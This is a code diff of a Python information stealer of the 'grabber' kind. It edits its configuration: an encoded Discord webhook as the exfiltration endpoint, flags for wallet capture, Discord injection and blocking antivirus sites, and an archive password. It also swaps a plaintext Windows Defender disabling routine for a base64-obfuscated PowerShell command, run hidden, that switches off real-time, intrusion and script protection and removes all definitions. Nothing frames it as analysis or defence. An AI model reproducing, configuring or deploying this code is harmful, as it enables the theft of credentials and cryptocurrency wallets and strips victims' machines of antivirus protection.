@@ -21,14 +21,14 @@ from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warni
 disable_warnings_urllib3()
 
 class Settings:
-    C2 = (1, base64.b64decode('ODg3MTk2NjgwNTpBQUdtMVlsUHA1a3BrbmNKaHEzUHNXWU45YjJOVjVUUVhrNCQtMTAwMzY4NjcwNTU0NA==').decode())
-    Mutex = base64.b64decode('ZGJiUWc3N21uWHFKSFhPVw==').decode()
-    PingMe = bool('')
-    Vmprotect = bool('true')
+    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwNzc5OTcxNzYzMzg1NTY0OS9IZ2EwaGh4ekczbG1hLW14dDBhZnJ6c01WaS1JV3JFU0xGX1p0VzJjQ2xYa1lJMC1nZXo3VVRULTFQRUV5QWxqUEtpWg==').decode())
+    Mutex = base64.b64decode('eXkxWmlWOVY4SWRKSHdZbQ==').decode()
+    PingMe = bool('true')
+    Vmprotect = bool('')
     Startup = bool('')
-    Melt = bool('true')
+    Melt = bool('')
     UacBypass = bool('')
-    ArchivePassword = base64.b64decode('Y3I=').decode()
+    ArchivePassword = base64.b64decode('Y3JveGx2').decode()
     HideConsole = bool('true')
     Debug = bool('')
     RunBoundOnStartup = bool('')
@@ -47,7 +47,7 @@ class Settings:
     CaptureWallets = bool('true')
     FakeError = (bool(''), ('', '', '0'))
     BlockAvSites = bool('true')
-    DiscordInjection = bool('')
+    DiscordInjection = bool('true')
 if not hasattr(sys, '_MEIPASS'):
     sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))
 ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7)
@@ -235,12 +235,8 @@ class Utility:
 
     @staticmethod
     def DisableDefender() -> None:
-        # Registry yolu ile kalıcı olarak devre dışı bırakma
-        reg_cmd = 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f'
-        subprocess.run(reg_cmd, shell=True, capture_output=True)
-        # Real-time protection kapatma (geçici)
-        rt_cmd = 'powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"'
-        subprocess.run(rt_cmd, shell=True, capture_output=True)
+        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors='ignore')
+        subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
 
     @staticmethod
     def ExcludeFromDefender(path: str=None) -> None:
